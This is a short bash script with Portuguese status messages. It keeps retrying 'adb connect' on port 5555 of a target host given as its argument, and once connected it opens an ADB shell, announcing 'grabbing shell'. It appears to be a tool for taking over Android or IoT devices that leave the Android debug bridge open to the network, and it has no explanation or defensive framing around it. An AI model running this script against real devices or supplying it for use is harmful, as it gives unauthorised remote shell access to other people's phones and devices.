#!/bin/bash
 
while : ; do
    OUTPUT="$(adb connect $1:5555)"
    if [[ $OUTPUT = *connected* ]]; then
        echo "[!] SUCESSO!! Conectado a $1:5555" 
 echo "[+] pegando shell"
sleep 1s
	adb shell 2> /dev/null || adb devices
        exit 1
    fi
    echo "[*] Conectando..."
    sleep .20
done
